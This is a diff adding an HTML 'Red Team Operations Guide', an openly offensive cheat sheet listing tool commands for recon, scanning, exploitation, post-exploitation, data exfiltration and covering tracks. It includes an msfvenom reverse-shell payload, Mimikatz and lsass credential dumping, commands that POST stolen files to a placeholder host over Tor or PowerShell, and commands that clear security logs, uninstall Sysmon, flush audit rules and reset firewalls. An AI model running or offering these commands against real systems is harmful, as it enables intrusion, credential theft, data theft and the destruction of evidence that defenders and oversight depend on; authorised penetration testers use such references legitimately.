@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Red Team Operations Guide</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto Mono', monospace;
+            background-color: #0d1117;
+            color: #c9d1d9;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+
+        /* Fixed Navigation Menu */
+        nav {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background-color: #161b22;
+            border-bottom: 2px solid #238636;
+            z-index: 1000;
+            padding: 10px 0;
+            text-align: center;
+        }
+
+        nav a {
+            color: #58a6ff;
+            text-decoration: none;
+            margin: 0 15px;
+            font-weight: bold;
+            font-family: 'Orbitron', sans-serif;
+            transition: color 0.3s ease;
+        }
+
+        nav a:hover {
+            color: #238636;
+        }
+
+        header {
+            padding-top: 80px; /* Adjust for fixed nav */
+            text-align: center;
+        }
+
+        header h1 {
+            font-family: 'Orbitron', sans-serif;
+            color: #238636;
+            margin: 0;
+            font-size: 2.5rem;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+        }
+
+        h2 {
+            font-family: 'Orbitron', sans-serif;
+            color: #238636;
+            margin-top: 30px;
+            border-bottom: 1px solid #30363d;
+            padding-bottom: 10px;
+        }
+
+        .card {
+            background-color: #161b22;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border: 1px solid #30363d;
+        }
+
+        .card h3 {
+            color: #58a6ff;
+            margin-top: 0;
+        }
+
+        pre {
+            background-color: #0d1117;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            color: #58a6ff;
+            border: 1px solid #30363d;
+        }
+
+        code {
+            font-family: 'Roboto Mono', monospace;
+            color: #58a6ff;
+        }
+
+        .section-description {
+            color: #8b949e;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>Red Team Guide</h1>
+        <p>This page is a comprehensive reference tool for Red Teamers. It provides a detailed roadmap with 20+ tools and commands per category, organized into the following sections:
+
+            Reconnaissance and Enumeration: Identify and gather information about the target.
+            
+            Vulnerability Scanning: Detect vulnerabilities in services and systems.
+            
+            Exploitation: Exploit vulnerabilities to gain initial access.
+            
+            Post-Exploitation: Maintain access, escalate privileges, and move laterally.
+            
+            Data Exfiltration: Stealthily extract sensitive data.
+            
+            Covering Tracks: Remove evidence and cover tracks to avoid detection.
+            
+            Each category includes a clear description and practical examples of commands and tools, ready to use in penetration testing and Red Team operations.</p>
+
+             <!-- Fixed Navigation Menu -->
+    <nav>
+        <a href="#recon">Recon</a>
+        <a href="#vuln-scan">Vuln Scan</a>
+        <a href="#exploitation">Exploitation</a>
+        <a href="#post-exploit">Post-Exploit</a>
+        <a href="#exfiltration">Exfiltration</a>
+        <a href="#covering-tracks">Covering Tracks</a>
+    </nav>
+
+    </header>
+
+    <div class="container">
+        <!-- Reconnaissance and Enumeration -->
+        <div class="card" id="recon">
+            <h2>1. Reconnaissance and Enumeration</h2>
+            <p class="section-description">
+                Identify and gather information about the target, such as domains, subdomains, IP addresses, exposed services, and potential attack vectors.
+            </p>
+            <h3>Nmap</h3>
+            <pre><code>nmap -sV -sC -oA scan_result 192.168.1.1</code></pre>
+            <h3>Recon-ng</h3>
+            <pre><code>recon-ng -m recon/domains-hosts/brute_hosts</code></pre>
+            <h3>Amass</h3>
+            <pre><code>amass enum -d example.com</code></pre>
+            <h3>Sublist3r</h3>
+            <pre><code>sublist3r -d example.com</code></pre>
+            <h3>Shodan</h3>
+            <pre><code>shodan host 192.168.1.1</code></pre>
+            <h3>theHarvester</h3>
+            <pre><code>theHarvester -d example.com -b all</code></pre>
+            <h3>DNSenum</h3>
+            <pre><code>dnsenum example.com</code></pre>
+            <h3>Masscan</h3>
+            <pre><code>masscan 192.168.1.1 -p1-65535 --rate=1000</code></pre>
+            <h3>Whois</h3>
+            <pre><code>whois example.com</code></pre>
+            <h3>Dig</h3>
+            <pre><code>dig example.com ANY</code></pre>
+            <h3>Netdiscover</h3>
+            <pre><code>netdiscover -i eth0 -r 192.168.1.0/24</code></pre>
+            <h3>Fierce</h3>
+            <pre><code>fierce -dns example.com</code></pre>
+            <h3>Maltego</h3>
+            <pre><code>maltego</code></pre>
+            <h3>SpiderFoot</h3>
+            <pre><code>spiderfoot -l</code></pre>
+            <h3>Aquatone</h3>
+            <pre><code>aquatone-discover -d example.com</code></pre>
+            <h3>Assetfinder</h3>
+            <pre><code>assetfinder example.com</code></pre>
+            <h3>Findomain</h3>
+            <pre><code>findomain -t example.com</code></pre>
+            <h3>Knockpy</h3>
+            <pre><code>knockpy example.com</code></pre>
+            <h3>Httprobe</h3>
+            <pre><code>cat domains.txt | httprobe</code></pre>
+            <h3>Waybackurls</h3>
+            <pre><code>waybackurls example.com</code></pre>
+        </div>
+
+        <!-- Vulnerability Scanning -->
+        <div class="card" id="vuln-scan">
+            <h2>2. Vulnerability Scanning</h2>
+            <p class="section-description">
+                Identify vulnerabilities in exposed services and systems.
+            </p>
+            <h3>Nessus</h3>
+            <pre><code>nessuscli scan --target 192.168.1.1</code></pre>
+            <h3>OpenVAS</h3>
+            <pre><code>openvas-cli --target 192.168.1.1</code></pre>
+            <h3>Nikto</h3>
+            <pre><code>nikto -h http://example.com</code></pre>
+            <h3>OWASP ZAP</h3>
+            <pre><code>zap-cli quick-scan -o -r http://example.com</code></pre>
+            <h3>Burp Suite</h3>
+            <pre><code>burpsuite</code></pre>
+            <h3>Wapiti</h3>
+            <pre><code>wapiti -u http://example.com</code></pre>
+            <h3>WPScan</h3>
+            <pre><code>wpscan --url http://example.com</code></pre>
+            <h3>SQLMap</h3>
+            <pre><code>sqlmap -u http://example.com/page?id=1 --dbs</code></pre>
+            <h3>XSStrike</h3>
+            <pre><code>xsstrike -u http://example.com</code></pre>
+            <h3>Dirb</h3>
+            <pre><code>dirb http://example.com</code></pre>
+            <h3>Gobuster</h3>
+            <pre><code>gobuster dir -u http://example.com -w wordlist.txt</code></pre>
+            <h3>Nuclei</h3>
+            <pre><code>nuclei -u http://example.com</code></pre>
+            <h3>Retire.js</h3>
+            <pre><code>retire --path /var/www/html</code></pre>
+            <h3>Lynis</h3>
+            <pre><code>lynis audit system</code></pre>
+            <h3>Skipfish</h3>
+            <pre><code>skipfish -o output http://example.com</code></pre>
+            <h3>Arachni</h3>
+            <pre><code>arachni http://example.com</code></pre>
+            <h3>Vega</h3>
+            <pre><code>vega</code></pre>
+            <h3>Acunetix</h3>
+            <pre><code>acunetix</code></pre>
+            <h3>Netsparker</h3>
+            <pre><code>netsparker</code></pre>
+        </div>
+
+        <!-- Exploitation -->
+        <div class="card" id="exploitation">
+            <h2>3. Exploitation</h2>
+            <p class="section-description">
+                Exploit identified vulnerabilities to gain initial access.
+            </p>
+            <h3>Metasploit</h3>
+            <pre><code>msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.1
+exploit</code></pre>
+            <h3>SQLMap</h3>
+            <pre><code>sqlmap -u http://example.com/page?id=1 --dbs</code></pre>
+            <h3>CrackMapExec</h3>
+            <pre><code>crackmapexec smb 192.168.1.1 -u admin -p password</code></pre>
+            <h3>Hydra</h3>
+            <pre><code>hydra -l admin -P passwords.txt ssh://192.168.1.1</code></pre>
+            <h3>John the Ripper</h3>
+            <pre><code>john --wordlist=passwords.txt hash.txt</code></pre>
+            <h3>Hashcat</h3>
+            <pre><code>hashcat -m 1000 hash.txt passwords.txt</code></pre>
+            <h3>Responder</h3>
+            <pre><code>responder -I eth0</code></pre>
+            <h3>Impacket</h3>
+            <pre><code>python3 smbclient.py -h 192.168.1.1</code></pre>
+            <h3>Empire</h3>
+            <pre><code>powershell-empire</code></pre>
+            <h3>Cobalt Strike</h3>
+            <pre><code>teamserver 192.168.1.1 password</code></pre>
+            <h3>BeEF</h3>
+            <pre><code>beef</code></pre>
+            <h3>Social-Engineer Toolkit (SET)</h3>
+            <pre><code>setoolkit</code></pre>
+            <h3>ExploitDB</h3>
+            <pre><code>searchsploit apache 2.4.29</code></pre>
+            <h3>Msfvenom</h3>
+            <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o payload.exe</code></pre>
+            <h3>Veil-Evasion</h3>
+            <pre><code>veil-evasion</code></pre>
+            <h3>Shellter</h3>
+            <pre><code>shellter</code></pre>
+            <h3>PowerSploit</h3>
+            <pre><code>Invoke-Mimikatz -DumpCreds</code></pre>
+            <h3>Mimikatz</h3>
+            <pre><code>mimikatz.exe privilege::debug sekurlsa::logonpasswords</code></pre>
+            <h3>BloodHound</h3>
+            <pre><code>bloodhound-python -d example.com -u user -p password</code></pre>
+        </div>
+
+        <!-- Post-Exploitation -->
+        <div class="card" id="post-exploit">
+            <h2>4. Post-Exploitation</h2>
+            <p class="section-description">
+                Maintain access, escalate privileges, and move laterally within the network.
+            </p>
+            <h3>Mimikatz</h3>
+            <pre><code>mimikatz.exe privilege::debug sekurlsa::logonpasswords</code></pre>
+            <h3>PowerSploit</h3>
+            <pre><code>Invoke-Mimikatz -DumpCreds</code></pre>
+            <h3>BloodHound</h3>
+            <pre><code>bloodhound-python -d example.com -u user -p password</code></pre>
+            <h3>Empire</h3>
+            <pre><code>powershell-empire</code></pre>
+            <h3>Cobalt Strike</h3>
+            <pre><code>teamserver 192.168.1.1 password</code></pre>
+            <h3>Metasploit</h3>
+            <pre><code>meterpreter > getuid</code></pre>
+            <h3>PsExec</h3>
+            <pre><code>psexec \\192.168.1.1 -u admin -p password cmd.exe</code></pre>
+            <h3>WMI</h3>
+            <pre><code>wmic /node:192.168.1.1 process call create "cmd.exe"</code></pre>
+            <h3>Impacket</h3>
+            <pre><code>python3 psexec.py admin:password@192.168.1.1</code></pre>
+            <h3>Netcat</h3>
+            <pre><code>nc -lvp 4444</code></pre>
+            <h3>SSH</h3>
+            <pre><code>ssh user@192.168.1.1</code></pre>
+            <h3>RDP</h3>
+            <pre><code>xfreerdp /u:admin /p:password /v:192.168.1.1</code></pre>
+            <h3>Procdump</h3>
+            <pre><code>procdump.exe -ma lsass.exe lsass.dmp</code></pre>
+            <h3>Mimikatz (Offline)</h3>
+            <pre><code>sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords</code></pre>
+            <h3>LaZagne</h3>
+            <pre><code>laZagne.exe all</code></pre>
+            <h3>Windows Credential Editor (WCE)</h3>
+            <pre><code>wce.exe -w</code></pre>
+            <h3>Meterpreter</h3>
+            <pre><code>meterpreter > hashdump</code></pre>
+            <h3>PowerUp</h3>
+            <pre><code>Invoke-AllChecks</code></pre>
+            <h3>PrivescCheck</h3>
+            <pre><code>Invoke-PrivescCheck -Extended</code></pre>
+        </div>
+
+        <!-- Data Exfiltration -->
+        <div class="card" id="exfiltration">
+            <h2>5. Data Exfiltration</h2>
+            <p class="section-description">
+                Extract sensitive data from the target stealthily.
+            </p>
+            <h3>DNSCAT2</h3>
+            <pre><code>dnscat2-server --secret=mysecret</code></pre>
+            <h3>Netcat</h3>
+            <pre><code>nc -lvp 4444 > file.txt</code></pre>
+            <h3>Rclone</h3>
+            <pre><code>rclone copy sensitive_data remote:backup</code></pre>
+            <h3>SCP</h3>
+            <pre><code>scp user@192.168.1.1:/path/to/file .</code></pre>
+            <h3>SFTP</h3>
+            <pre><code>sftp user@192.168.1.1</code></pre>
+            <h3>HTTP</h3>
+            <pre><code>python3 -m http.server 8080</code></pre>
+            <h3>FTP</h3>
+            <pre><code>ftp 192.168.1.1</code></pre>
+            <h3>ICMP</h3>
+            <pre><code>icmp-exfil -i eth0 -f file.txt</code></pre>
+            <h3>DNS</h3>
+            <pre><code>dns-exfil -d example.com -f file.txt</code></pre>
+            <h3>Email</h3>
+            <pre><code>sendemail -f from@example.com -t to@example.com -u "Subject" -m "Body" -a file.txt</code></pre>
+            <h3>Cloud Storage</h3>
+            <pre><code>aws s3 cp file.txt s3://mybucket/</code></pre>
+            <h3>Tor</h3>
+            <pre><code>torsocks curl -X POST -d @file.txt http://example.com</code></pre>
+            <h3>WebDAV</h3>
+            <pre><code>cadaver http://example.com/webdav</code></pre>
+            <h3>SSH Tunnel</h3>
+            <pre><code>ssh -L 8080:localhost:80 user@192.168.1.1</code></pre>
+            <h3>Metasploit</h3>
+            <pre><code>meterpreter > download file.txt</code></pre>
+            <h3>PowerShell</h3>
+            <pre><code>Invoke-WebRequest -Uri http://example.com -Method POST -Body (Get-Content file.txt)</code></pre>
+            <h3>Base64</h3>
+            <pre><code>base64 file.txt</code></pre>
+            <h3>Steganography</h3>
+            <pre><code>steghide embed -cf image.jpg -ef file.txt</code></pre>
+            <h3>Zip</h3>
+            <pre><code>zip -r archive.zip file.txt</code></pre>
+            <h3>Encryption</h3>
+            <pre><code>openssl enc -aes-256-cbc -salt -in file.txt -out file.enc</code></pre>
+        </div>
+
+        <!-- Covering Tracks -->
+        <div class="card" id="covering-tracks">
+            <h2>6. Covering Tracks</h2>
+            <p class="section-description">
+                Remove evidence of the attack and cover tracks to avoid detection.
+            </p>
+            <h3>Timestomp</h3>
+            <pre><code>timestomp file.txt -m "01/01/2023 00:00:00"</code></pre>
+            <h3>CCleaner</h3>
+            <pre><code>ccleaner.exe /AUTO</code></pre>
+            <h3>BleachBit</h3>
+            <pre><code>bleachbit</code></pre>
+            <h3>Shred</h3>
+            <pre><code>shred -u file.txt</code></pre>
+            <h3>Rm</h3>
+            <pre><code>rm -rf file.txt</code></pre>
+            <h3>Event Viewer</h3>
+            <pre><code>wevtutil cl Security</code></pre>
+            <h3>Log Deletion</h3>
+            <pre><code>del /f /q C:\Windows\System32\LogFiles\*.*</code></pre>
+            <h3>IIS Logs</h3>
+            <pre><code>del /f /q C:\inetpub\logs\LogFiles\*.*</code></pre>
+            <h3>Apache Logs</h3>
+            <pre><code>rm -rf /var/log/apache2/*</code></pre>
+            <h3>Nginx Logs</h3>
+            <pre><code>rm -rf /var/log/nginx/*</code></pre>
+            <h3>Sysmon</h3>
+            <pre><code>sysmon -u</code></pre>
+            <h3>Auditd</h3>
+            <pre><code>auditctl -D</code></pre>
+            <h3>Firewall</h3>
+            <pre><code>netsh advfirewall reset</code></pre>
+            <h3>Registry</h3>
+            <pre><code>reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor</code></pre>
+            <h3>Task Scheduler</h3>
+            <pre><code>schtasks /delete /tn "Backdoor"</code></pre>
+            <h3>SSH</h3>
+            <pre><code>rm -rf ~/.ssh/known_hosts</code></pre>
+            <h3>Bash History</h3>
+            <pre><code>history -c</code></pre>
+            <h3>PowerShell History</h3>
+            <pre><code>Clear-History</code></pre>
+            <h3>Metasploit</h3>
+            <pre><code>meterpreter > clearev</code></pre>
+        </div>
+    </div>
+</body>
+</html>
